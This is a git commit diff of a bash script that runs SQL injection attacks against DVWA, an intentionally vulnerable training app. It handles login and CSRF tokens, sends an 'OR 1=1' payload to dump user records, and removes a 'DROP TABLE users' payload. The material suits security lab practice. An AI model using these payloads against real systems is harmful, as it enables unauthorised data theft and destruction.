dcb6c2406c86b2d447c02c9a32de3157525e6d41
Incogn1toBro <griffen-0@hotmail.com>
2026-03-15 17:23:56 +1100

    Update sqli-attack.sh

--- infra/attack-scripts/sqli-attack.sh
+++ infra/attack-scripts/sqli-attack.sh
@@ -1,15 +1,18 @@
 #!/bin/bash
 
-TARGET="INSERT DVWA IP HERE:8080"
+TARGET="DVWA IP ADDRESS:8080"
 USERNAME="admin"
 PASSWORD="password"
 COOKIE_JAR="/tmp/dvwa_cookies.txt"
 
-echo "=== Logging into DVWA ==="
-curl -s -c "$COOKIE_JAR" "http://$TARGET/login.php" > /dev/null
+echo "=== Grabbing CSRF token ==="
+LOGIN_PAGE=$(curl -s -c "$COOKIE_JAR" "http://$TARGET/login.php")
+USER_TOKEN=$(echo "$LOGIN_PAGE" | grep -oP "user_token'\s*value='\K[^']+")
+echo "Got token: $USER_TOKEN"
 
+echo "=== Logging into DVWA ==="
 curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
-  -d "username=$USERNAME&password=$PASSWORD&Login=Login" \
+  -d "username=$USERNAME&password=$PASSWORD&Login=Login&user_token=$USER_TOKEN" \
   "http://$TARGET/login.php" > /dev/null
 
 PHPSESSID=$(grep PHPSESSID "$COOKIE_JAR" | awk '{print $NF}')
@@ -17,8 +20,13 @@ echo "Got PHPSESSID: $PHPSESSID"
 
 echo "=== SQL Injection Attacks ==="
 
-curl -s "http://$TARGET/vulnerabilities/sqli/?id=1%27+OR+1%3D1--+" \
-  -b "PHPSESSID=$PHPSESSID; security=low" | grep -i user
-
-curl -s "http://$TARGET/vulnerabilities/sqli/?id=1%3B+DROP+TABLE+users--" \
-  -b "PHPSESSID=$PHPSESSID; security=low" | grep -i error
+echo "--- Auth Bypass ---"
+curl -s -G "http://$TARGET/vulnerabilities/sqli/" \
+  --data-urlencode "id=1%27+OR+1%3D1--+" \
+  --data-urlencode "Submit=Submit" \
+  -b "PHPSESSID=$PHPSESSID; security=low" \
+  | sed 's/<br \/>/\n/g' \
+  | sed 's/<[^>]*>//g' \
+  | grep -E "First name:|Surname:" \
+  | sed 's/^[[:space:]]*//' \
+  | paste - -
